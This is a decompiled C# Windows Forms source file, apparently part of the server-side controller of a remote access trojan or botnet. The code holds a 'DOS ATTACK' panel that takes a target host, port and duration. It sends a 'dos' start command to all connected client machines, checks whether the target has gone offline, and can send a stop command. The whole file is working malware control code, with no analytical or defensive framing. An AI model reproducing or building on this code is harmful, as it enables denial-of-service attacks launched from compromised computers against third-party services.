﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Server.Connection;
using Server.MessagePack;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace Server.Forms
{
	// Token: 0x02000092 RID: 146
	public partial class FormDOS : Form
	{
		// Token: 0x0600045D RID: 1117 RVA: 0x000044B6 File Offset: 0x000026B6
		public FormDOS()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600045E RID: 1118 RVA: 0x0002A570 File Offset: 0x00028770
		private void BtnAttack_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrWhiteSpace(this.txtHost.Text) || string.IsNullOrWhiteSpace(this.txtPort.Text) || string.IsNullOrWhiteSpace(this.txtTimeout.Text))
			{
				return;
			}
			try
			{
				if (!this.txtHost.Text.ToLower().StartsWith("http://"))
				{
					this.txtHost.Text = "http://" + this.txtHost.Text;
				}
				new Uri(this.txtHost.Text);
			}
			catch
			{
				return;
			}
			if (this.PlguinClients.Count > 0)
			{
				try
				{
					this.btnAttack.Enabled = false;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "dos";
					msgPack.ForcePathObject("Option").AsString = "postStart";
					msgPack.ForcePathObject("Host").AsString = this.txtHost.Text;
					msgPack.ForcePathObject("Port").AsString = this.txtPort.Text;
					msgPack.ForcePathObject("Timeout").AsString = this.txtTimeout.Text;
					foreach (Clients clients in this.PlguinClients)
					{
						this.selectedClients.Add(clients);
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
					this.btnStop.Enabled = true;
					this.timespan = TimeSpan.FromSeconds((double)(Convert.ToInt32(this.txtTimeout.Text) * 60));
					this.stopwatch = new Stopwatch();
					this.stopwatch.Start();
					this.timer1.Start();
					this.timer2.Start();
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600045F RID: 1119 RVA: 0x0002A7A4 File Offset: 0x000289A4
		private void BtnStop_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "dos";
				msgPack.ForcePathObject("Option").AsString = "postStop";
				foreach (Clients @object in this.PlguinClients)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
				}
				this.selectedClients.Clear();
				this.btnAttack.Enabled = true;
				this.btnStop.Enabled = false;
				this.timer1.Stop();
				this.timer2.Stop();
				this.status = "is online";
			}
			catch
			{
			}
		}

		// Token: 0x06000460 RID: 1120 RVA: 0x0002A88C File Offset: 0x00028A8C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.Text = string.Format("DOS ATTACK:{0}    Status:host {1}", this.timespan.Subtract(TimeSpan.FromSeconds((double)this.stopwatch.Elapsed.Seconds)), this.status);
			if (this.timespan < this.stopwatch.Elapsed)
			{
				this.btnAttack.Enabled = true;
				this.btnStop.Enabled = false;
				this.timer1.Stop();
				this.timer2.Stop();
				this.status = "is online";
			}
		}

		// Token: 0x06000461 RID: 1121 RVA: 0x0002A92C File Offset: 0x00028B2C
		private void Timer2_Tick(object sender, EventArgs e)
		{
			try
			{
				WebRequest.Create(new Uri(this.txtHost.Text)).GetResponse().Dispose();
				this.status = "is online";
			}
			catch
			{
				this.status = "is offline";
			}
		}

		// Token: 0x06000462 RID: 1122 RVA: 0x0002A984 File Offset: 0x00028B84
		private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				foreach (Clients clients in this.PlguinClients)
				{
					clients.Disconnected();
				}
				this.PlguinClients.Clear();
				this.selectedClients.Clear();
			}
			catch
			{
			}
			base.Hide();
			base.Parent = null;
			e.Cancel = true;
		}

		// Token: 0x04000365 RID: 869
		private TimeSpan timespan;

		// Token: 0x04000366 RID: 870
		private Stopwatch stopwatch;

		// Token: 0x04000367 RID: 871
		private string status = "is online";

		// Token: 0x04000368 RID: 872
		public object sync = new object();

		// Token: 0x04000369 RID: 873
		public List<Clients> selectedClients = new List<Clients>();

		// Token: 0x0400036A RID: 874
		public List<Clients> PlguinClients = new List<Clients>();
	}
}
